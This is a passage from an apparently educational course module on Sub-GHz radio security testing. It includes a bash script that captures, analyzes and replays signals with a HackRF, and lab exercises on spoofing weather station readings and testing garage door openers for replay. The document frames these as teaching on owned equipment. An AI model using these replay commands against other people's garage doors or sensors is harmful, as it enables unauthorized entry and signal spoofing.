# Automated Sub-GHz Replay Testing Framework
# Captures, analyzes, and replays Sub-GHz signals for authorized testing

set -euo pipefail

FREQ="${1:-433920000}"
RATE="${2:-8000000}"
CAPTURE_FILE="replay_capture.raw"

echo "[*] Sub-GHz Replay Testing Framework"
echo "[*] Frequency: ${FREQ} Hz ($(( FREQ / 1000000 )) MHz)"
echo "[*] Sample rate: ${RATE} SPS"

# Step 1: Capture the target signal
echo ""
echo "[1/3] Capturing signal..."
echo "    Press the button / trigger the device now..."
hackrf_transfer -r "${CAPTURE_FILE}" -f "${FREQ}" -s "${RATE}" -l 32 -g 20 -n 80000000

# Step 2: Analyze the capture
echo ""
echo "[2/3] Analyzing captured signal..."
python3 -c "
import numpy as np
raw = np.fromfile('${CAPTURE_FILE}', dtype=np.int8)
iq = raw[0::2].astype(np.float32)/128.0 + 1j * raw[1::2].astype(np.float32)/128.0
amplitude = np.abs(iq)
peak = np.max(amplitude)
mean = np.mean(amplitude)
above_threshold = np.sum(amplitude > mean + 3*np.std(amplitude))
print(f'  Samples: {len(iq)}')
print(f'  Duration: {len(iq)/${RATE}*1000:.1f} ms')
print(f'  Peak amplitude: {peak:.3f}')
print(f'  Active samples: {above_threshold} ({above_threshold/len(iq)*100:.1f}%)')

if above_threshold > 100:
    print('  [+] Signal detected - ready for replay')
else:
    print('  [!] Weak or no signal detected - check frequency and gain')
"

# Step 3: Replay the signal
echo ""
echo "[3/3] Ready to replay..."
echo "    Transmit command:"
echo "    hackrf_transfer -t ${CAPTURE_FILE} -f ${FREQ} -s ${RATE} -x 30"
echo ""
echo "    [!] ONLY transmit on frequencies and devices you own"
echo "    [!] Unauthorized transmission is illegal in most jurisdictions"
```

## Hands-on Exercises

### Exercise 1: Weather Station Signal Capture and Decode

**Objective**: Capture a weather station signal at 433.92 MHz, decode the temperature and humidity data, and generate a spoofed signal that transmits fabricated sensor readings.

**Setup**: You need a HackRF One or RTL-SDR with an appropriate 433 MHz antenna, and a consumer weather station that transmits on 433.92 MHz. Alternatively, use a 433 MHz transmitter module (e.g., FS1000A) with an Arduino to simulate a weather station.

**Tasks**:

1. Capture the weather station signal during a transmission:
   ```bash
   # Capture 10 seconds at 433.92 MHz
   hackrf_transfer -r weather_capture.raw -f 433920000 -s 8000000 -l 32 -g 20 -n 80000000

   # Trigger the weather station to transmit during capture
   ```

2. Analyze the signal in inspectrum and URH:
   ```bash
   # Visual analysis
   inspectrum weather_capture.raw -r 8000000 --centre-frequency 433920000

   # Protocol analysis
   urh weather_capture.raw
   ```

3. Decode the temperature and humidity from the captured signal using the weather station decoder script.

4. Generate a spoofed signal with fabricated temperature (e.g., 40 C) and replay it to the weather station display unit (owned equipment only).

**Deliverables**: Captured signal file, decoded sensor data, spoofed signal file, written analysis of the protocol and its vulnerabilities.

### Exercise 2: Garage Door Rolling Code vs Fixed Code Assessment

**Objective**: Determine whether a garage door opener uses fixed codes or rolling codes by analyzing multiple captures, and assess the replay attack feasibility.

**Setup**: You need a HackRF One and a garage door opener remote that you own. Use two different remotes if possible: one older (pre-2010, likely fixed code) and one modern (likely rolling code).

**Tasks**:

1. Capture 5 consecutive button presses from the same remote:
   ```bash
   for i in 1 2 3 4 5; do
     echo "Press button for capture $i..."
     hackrf_transfer -r garage_press_${i}.raw -f 390000000 -s 2000000 -l 32 -g 20 -n 10000000
     sleep 2
   done
   ```

2. Compare the captures using the Garage Door Analyzer:
   ```bash
   python3 garage_door_analyzer.py garage_press_*.raw
   ```

3. Document whether the system uses fixed or rolling codes and assess attack feasibility.

4. For fixed-code systems, demonstrate replay in a controlled environment. For rolling-code systems, document the code structure and estimate the counter space.

**Deliverables**: 5 capture files, fixed/rolling code analysis report, replay demonstration (if applicable), security assessment with recommendations.

## References

1. **ITU Radio Regulations** - International Telecommunication Union regulations governing ISM band usage and transmission limits for Sub-GHz devices worldwide.

2. **FCC Part 15** - U.S. Federal Communications Commission rules governing unlicensed RF devices including 315 MHz, 433 MHz, and 902-928 MHz ISM bands.

3. **ETSI EN 300 220** - European standard for Short Range Devices (SRD) operating in the 25 MHz to 1000 MHz frequency range.

4. **Samy Kamkar - "RollingCode" Research** - Pioneering research on rolling code attacks against garage door openers and keyless entry systems, https://samy.pl/

5. **Andrew Tierney - Sub-GHz IoT Security Research** - Multiple publications on Sub-GHz IoT device vulnerabilities including weather stations, smart plugs, and home automation.

6. **RFcat and YardStickOne Community** - Open-source Sub-GHz radio tools and documentation for security research on ISM band devices.

7. **Flipper Zero Documentation** - Comprehensive Sub-GHz protocol database covering hundreds of IoT devices and their RF characteristics, https://docs.flipper.net/

8. **URH (Universal Radio Hacker) Documentation** - Protocol reverse engineering tool documentation for analyzing Sub-GHz IoT protocols, https://github.com/jopohl/urh

9. **Cisco IOx IoT Security** - Industrial IoT security guidelines including Sub-GHz device hardening recommendations.
